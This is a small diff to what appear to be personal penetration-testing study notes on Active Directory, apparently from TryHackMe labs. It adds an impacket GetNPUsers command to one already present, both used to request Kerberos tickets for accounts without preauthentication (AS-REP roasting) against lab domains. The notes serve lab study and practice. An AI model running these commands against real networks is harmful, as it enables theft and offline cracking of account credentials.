@@ -11,5 +11,6 @@ Utilizing impacket-GetNPUsers will give us the TGT of users with this privileges
 
 ```
 impacket-GetNPUsers -dc-ip 10.10.18.74 "spookysec.local/svc-admin" -no-pass
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py thm.corp/ -no-pass -usersfile ../Exploiting/OSCP_Prep/THM/ActiveDirectory/Reset/users.txt
 ```
 
